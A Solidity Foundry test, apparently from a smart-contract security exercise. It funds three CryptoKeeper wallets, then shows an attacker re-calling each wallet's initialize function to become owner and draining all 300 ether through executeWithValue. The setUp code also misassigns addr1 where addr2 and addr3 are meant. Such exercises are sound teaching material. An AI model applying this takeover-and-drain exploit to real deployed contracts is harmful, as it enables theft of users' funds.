// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import {CryptoKeeperFactory} from "src/call-attacks-3/CryptoKeeperFactory.sol";
import {ICryptoKeeper} from "src/call-attacks-3/ICryptoKeeper.sol";
import {CryptoKeeper} from "src/call-attacks-3/CryptoKeeper.sol";
import {DummyERC20} from "src/utils/DummyERC20.sol";


contract CATest3 is Test {
    CryptoKeeperFactory cryptoKeeperFactory;
    CryptoKeeper cryptoKeeper;
    ICryptoKeeper cryptoKeeper1;
    ICryptoKeeper cryptoKeeper2;
    ICryptoKeeper cryptoKeeper3;
    DummyERC20 dummyERC20;

    address deployer = makeAddr("deployer");
    address user1 = makeAddr("user1");
    address user2 = makeAddr("user2");
    address user3 = makeAddr("user3");
    address attacker = makeAddr("attacker");

    uint256 private constant INITIAL_SUPPLY = 100 ether;

    function setUp() public {
        vm.deal(deployer, 101 ether);
        vm.deal(user1, 101 ether);
        vm.deal(user2, 101 ether);
        vm.deal(user3, 101 ether);
        vm.deal(attacker, 100 ether);

        vm.startPrank(deployer);
        dummyERC20 = new DummyERC20("Test", "TST", INITIAL_SUPPLY);
        cryptoKeeper = new CryptoKeeper();
        cryptoKeeperFactory = new CryptoKeeperFactory(deployer, address(cryptoKeeper));
        vm.stopPrank();

        vm.startPrank(user1);
        address[] memory addr1 = new address[](1);
        addr1[0] = user1;
        bytes32 salt1 = keccak256(abi.encodePacked(user1));
        address predict1 = cryptoKeeperFactory.predictCryptoKeeperAddress(salt1);
        cryptoKeeperFactory.createCryptoKeeper(salt1, addr1);
        cryptoKeeper1 = ICryptoKeeper(predict1);
        (bool succes, ) = address(cryptoKeeper1).call{value: INITIAL_SUPPLY}("");
        assertEq(address(cryptoKeeper1).balance, INITIAL_SUPPLY);
        vm.stopPrank();

        vm.startPrank(user2);
        address[] memory addr2 = new address[](1);
        addr1[0] = user2;
        bytes32 salt2 = keccak256(abi.encodePacked(user2));
        address predict2 = cryptoKeeperFactory.predictCryptoKeeperAddress(salt2);
        cryptoKeeperFactory.createCryptoKeeper(salt2, addr2);
        cryptoKeeper2 = ICryptoKeeper(predict2);
        (bool succes2, ) = address(cryptoKeeper2).call{value: INITIAL_SUPPLY}("");
        assertEq(address(cryptoKeeper2).balance, INITIAL_SUPPLY);
        vm.stopPrank();

        vm.startPrank(user3);
        address[] memory addr3 = new address[](1);
        addr1[0] = user3;
        bytes32 salt3 = keccak256(abi.encodePacked(user3));
        address predict3 = cryptoKeeperFactory.predictCryptoKeeperAddress(salt3);
        cryptoKeeperFactory.createCryptoKeeper(salt3, addr3);
        cryptoKeeper3 = ICryptoKeeper(predict3);
        (bool success3, ) = address(cryptoKeeper3).call{value: INITIAL_SUPPLY}("");
        assertEq(address(cryptoKeeper3).balance, INITIAL_SUPPLY);
        vm.stopPrank();
    }

    function test_Attack() public {
        vm.startPrank(attacker);
        address[] memory addr1 = new address[](1);
        addr1[0] = attacker;

        cryptoKeeper1.initialize(addr1);
        cryptoKeeper1.executeWithValue(attacker, "", INITIAL_SUPPLY);
        cryptoKeeper2.initialize(addr1);
        cryptoKeeper2.executeWithValue(attacker, "", INITIAL_SUPPLY);
        cryptoKeeper3.initialize(addr1);
        cryptoKeeper3.executeWithValue(attacker, "", INITIAL_SUPPLY);
        vm.stopPrank();

        assertEq(attacker.balance, INITIAL_SUPPLY + (INITIAL_SUPPLY * 3));
    }
}